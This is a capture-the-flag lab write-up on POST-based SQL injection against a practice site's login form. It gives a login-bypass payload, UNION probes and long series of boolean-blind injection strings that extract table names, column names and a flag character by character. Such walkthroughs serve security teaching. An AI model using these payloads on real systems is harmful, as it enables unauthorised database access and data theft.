# Lab 6.6.3 SQL Post Injection

## 0x00 Basic Knowledge

POST Injuection is generally same as GET. The only difference is about how they transfer parameters to server.

POST injection normally appears at:

- Login form
- Query form
- and all other forms which may interact with database

A typical example is login bypass.

```sql
') OR 1=1#
```

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### Home Page

![](./imgs/home.jpg)

### Injection Point

```sql
') OR 1=1#
```

![](./imgs/login.jpg)

### Field Number

So there are 2 fields for UNION SELECT

```sql
') OR 1=1 ORDER BY 1,2#
```

![](./imgs/order.jpg)

### Display Location

```sql
') AND 1=2 UNION SELECT 1,2#
```

![](./imgs/display.jpg)

However, there is no direct display of SELECT results. So may try with [blind injection](../lab6.2.1_sql_blind_based_injection).

#### Success

![](./imgs/true.jpg)

#### Failure

![](./imgs/false.jpg)

### TABLE_NAME

#### emails

```sql
#emails
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),1,1)))=101#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),2,1)))=109#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),3,1)))=97#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),4,1)))=105#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),5,1)))=108#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),6,1)))=115#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),7,1)))=0#
```

#### referers

```sql
#referers
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),1,1)))=114#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),2,1)))=101#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),3,1)))=102#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),4,1)))=101#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),5,1)))=114#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),6,1)))=101#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),7,1)))=114#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),8,1)))=115#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),9,1)))=0#
```

#### uagents

```sql
#uagents
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),1,1)))=117#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),2,1)))=97#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),3,1)))=103#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),4,1)))=101#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),5,1)))=110#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),6,1)))=116#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),7,1)))=115#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),8,1)))=0#
```

#### users

```sql
#users
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),1,1)))=117#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),2,1)))=115#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),3,1)))=101#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),4,1)))=114#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),5,1)))=115#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),6,1)))=0#
```

#### **zkaq**

```sql
#zkaq
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),1,1)))=122#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),2,1)))=107#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),3,1)))=97#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),4,1)))=113#
') OR (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),5,1)))=0#
```

### COLUMN_NAME

#### flag

```sql
#flag
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),1,1)))=102#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),2,1)))=108#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),3,1)))=97#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),4,1)))=103#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),5,1)))=0#
```

#### **zKaQ**

```sql
#zKaQ
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),1,1)))=122#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),2,1)))=75#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),3,1)))=97#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),4,1)))=81#
') OR (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),5,1)))=0#
```

### FLAG

```sql
#zKaQ-HacKTw1st
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),1,1)))=122#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),2,1)))=75#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),3,1)))=97#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),4,1)))=81#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),5,1)))=45#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),6,1)))=72#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),7,1)))=97#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),8,1)))=99#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),9,1)))=75#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),10,1)))=84#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),11,1)))=119#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),12,1)))=49#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),13,1)))=115#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),14,1)))=116#
') OR (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=18),15,1)))=0#
```

[1]: https://hack.zkaq.org/?a=battle&f=target&id=a6601b8f1c7ad977
